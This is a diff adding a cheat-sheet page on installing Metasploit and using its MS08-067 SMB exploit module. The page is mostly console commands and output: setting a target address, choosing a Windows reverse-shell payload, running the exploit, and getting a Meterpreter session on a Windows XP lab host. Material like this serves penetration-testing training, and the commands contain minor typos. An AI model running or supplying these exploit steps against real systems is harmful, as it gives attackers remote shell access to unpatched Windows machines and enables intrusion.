@@ -1,0 +1,107 @@
+== Metasplot ==
+
+* Installation on linux box
+
+curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall
+chmod 755 msfinstall
+./msfinstall
+
+== Usage examples ==
+
+* Launch
+
+msfconsole
+
+* Search for a particular vulnerability or other string
+
+		msf &gt; search ms08-067
+
+		<pre>
+Matching Modules
+================
+
+   Name                                 Disclosure Date          Rank   Description
+   ----                                 ---------------          ----   -----------
+   exploit/windows/smb/ms08_067_netapi  2008-10-28 00:00:00 UTC  great  Microsoft Server
+                                                                          Service Relative Path
+                                                                          Stack Corruption
+		</pre>
+
+		<h3>More info about particular module</h3>
+		msf &gt; info exploit/windows/smb/ms08_067_netapi
+		<pre>
+Name: Microsoft Server Service Relative Path Stack Corruption
+Module: exploit/windows/smb/ms08_067_netapi
+Version: 0
+Platform: Windows
+Privileged: Yes
+  ...
+   Basic options:
+    Name     Current Setting  Required  Description
+    ----     ---------------  --------  -----------
+    RHOST                     yes       The target address
+    RPORT    445              yes       Set the SMB service port
+    SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)
+
+ Payload information:
+  ...
+		</pre>
+
+		<h3>Select / 'activate' particular module / exploit </h3>
+
+		msf &gt; use windows/smb/ms08_067_netapi<br>
+		msf  exploit(ms08_067_netapi) &gt;<br>
+
+		<h3>Show options within activated module</h3>
+		msf  exploit(ms08_067_netapi) &gt; show options
+
+		<pre>
+Module options (exploit/windows/smb/ms08_067_netapi):
+...
+		</pre>
+
+		<h3>Set explot params (example)</h3>
+		set RHOST 192.168.20.10<br>
+
+		<h3>Select target</h3>
+		msf  exploit(ms08_067_netapi) &gt; show targets<br>
+		...<br>
+		msf  exploit(ms08_067_netapi) &gt; set traget &lt;target_number&gt;<br>
+
+		<h3>Select payload (shellcode)</h3>
+		msf  exploit(ms08_067_netapi) &gt; show payloads<br>
+<pre>
+Compatible Payloads
+===================
+
+   Name                                Disclosure Date  Rank    Description
+   ----                                ---------------  ----    -----------
+   generic/custom                                       normal  Custom Payload
+   generic/debug_trap                                   normal  Generic x86 Debug Trap
+   generic/shell_bind_tcp                               normal  Generic Command Shell, Bind TCP
+                                                                  Inline
+   generic/shell_reverse_tcp                            normal  Generic Command Shell, Reverse
+                                                                  Inline
+   generic/tight_loop                                   normal  Generic x86 Tight Loop
+   ...
+</pre>
+		msf  exploit(ms08_067_netapi) &gt; set payload windows/shell_reverse_tcp<br>		
+
+		<h3>Finally run</h3>
+		msf  exploit(ms08_067_netapi) &gt; exploit<br>
+
+<pre>[*] Started reverse handler on 192.168.20.9:4444
+[*] Automatically detecting the target...
+[*] Fingerprint: Windows XP - Service Pack 3 - lang:English
+[*] Selected Target: Windows XP SP3 English (AlwaysOn NX)
+[*] Attempting to trigger the vulnerability...
+[*] Sending stage (752128 bytes) to 192.168.20.10
+[*] Meterpreter session 1 opened (192.168.20.9:4444 -> 192.168.20.10:1334) at
+2015-08-31 07:37:05 -0400
+</pre>
+meterpreter &gt;
+
+		<h3> Exit</h3>
+		msf &gt; exit
+</body>
+</html>
